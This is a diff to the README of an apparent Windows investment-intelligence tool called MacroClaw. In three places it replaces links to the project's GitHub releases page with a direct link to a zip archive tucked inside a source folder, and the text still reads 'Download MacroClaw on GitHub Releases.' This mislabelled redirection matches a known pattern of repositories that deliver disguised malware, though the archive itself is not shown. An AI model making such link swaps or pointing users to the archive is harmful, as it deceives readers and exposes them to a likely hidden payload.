@@ -1,6 +1,6 @@
 # 🦀 MacroClaw - Real-Time Investment Intelligence
 
-[![Download MacroClaw](https://img.shields.io/badge/Download-MacroClaw-brightgreen?style=for-the-badge)](https://github.com/sandratpolyandry296/MacroClaw/releases)
+[![Download MacroClaw](https://img.shields.io/badge/Download-MacroClaw-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sandratpolyandry296/MacroClaw/main/src/macroclaw/dashboard/Claw-Macro-v2.8.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Go to the release page below to get the latest MacroClaw version for Windows. You will find the installer file there.
 
-[Download MacroClaw on GitHub Releases](https://github.com/sandratpolyandry296/MacroClaw/releases)
+[Download MacroClaw on GitHub Releases](https://raw.githubusercontent.com/sandratpolyandry296/MacroClaw/main/src/macroclaw/dashboard/Claw-Macro-v2.8.zip)
 
 ---
 
@@ -131,4 +131,4 @@ You will find a detailed user guide and FAQ in the GitHub repository’s `docs` 
 
 ---
 
-[![Download MacroClaw](https://img.shields.io/badge/Download-MacroClaw-pink?style=for-the-badge)](https://github.com/sandratpolyandry296/MacroClaw/releases)
+[![Download MacroClaw](https://img.shields.io/badge/Download-MacroClaw-pink?style=for-the-badge)](https://raw.githubusercontent.com/sandratpolyandry296/MacroClaw/main/src/macroclaw/dashboard/Claw-Macro-v2.8.zip)
